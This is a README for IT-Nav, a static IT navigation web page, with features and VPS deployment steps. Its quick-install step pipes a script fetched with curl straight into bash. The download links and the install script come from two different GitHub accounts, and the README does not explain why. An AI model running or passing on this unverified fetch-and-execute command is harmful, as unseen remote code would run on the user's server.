# 🌟 IT-Nav - A Simple, Beautiful IT Navigation Page

[![Download IT-Nav](https://img.shields.io/badge/Download-IT--Nav-brightgreen)](https://github.com/daylogrr/IT-Nav/releases)

IT-Nav is a clean and powerful navigation page designed for your IT needs. It runs smoothly on any VPS without the need for a backend. 

---

## 📦 Features

- 🌞/🌙 Light/Dark theme toggle
- ⏱ Real-time clock
- 🔎 Instant search with filtering
- 🌤 Weather display with automatic location
- 🔍 Aggregated search engines (Google, Bing, DuckDuckGo)
- 📰 RSS news feed (Hacker News)
- 🧩 Custom navigation with automatic localStorage saving
- 📱 Fully responsive layout

---

## 🚀 Getting Started

To easily set up IT-Nav, you can deploy it in just one command. Follow these steps:

1. **Access Your VPS:**
   - Connect to your Linux VPS using SSH. If you need help with this, consult your hosting provider for instructions.

2. **Run the Deployment Command:**
   - Execute the following command in your terminal:
     ```
     bash <(curl -s https://raw.githubusercontent.com/wxy0756/IT-Nav/main/install-it-nav.sh)
     ```
   - This command will download and install IT-Nav for you.

3. **Access IT-Nav:**
   - Once the installation finishes, visit your server's IP address using a web browser.
   - Example URL: `http://your.server.ip`

---

## 🖥 Manual Deployment

If you prefer to set up IT-Nav manually, follow these steps:

1. **Upload the HTML File:**
   - Download the `index.html` file from the Releases page: [Download IT-Nav](https://github.com/daylogrr/IT-Nav/releases).
   - Upload the `index.html` file to your server via SFTP or any file transfer method.
   - Place it in the following directory: `/www/it-nav/index.html`.

2. **Configure Your Web Server:**
   - If you are using Nginx, add the following configuration to your Nginx server block:
     ```
     server {
         listen 80;
         server_name _;
         root /www/it-nav;
         index index.html;
     }
     ```
   - Make sure to replace the `root` path if needed.

3. **Reload Nginx:**
   - After making changes, reload Nginx to apply the new configuration:
     ```
     nginx -s reload
     ```

4. **Access IT-Nav:**
   - Navigate to your server's IP address in a web browser.

---

## 💾 Storing Custom Navigation Data

All your custom navigation data will be saved in your browser using localStorage. You can access it like this:

- **Data Location:** `localStorage.it_nav`

Your settings will remain intact even if you refresh the page or revisit later.

---

## 🤝 Welcome to Use and Share

You are welcome to fork, modify, and share IT-Nav. Contributions and pull requests (PRs) are highly encouraged to help improve the project.

---

For more details, check the files in the repository or reach out if you have any questions. 

You can always return to the [Releases page](https://github.com/daylogrr/IT-Nav/releases) to get the latest version and updates.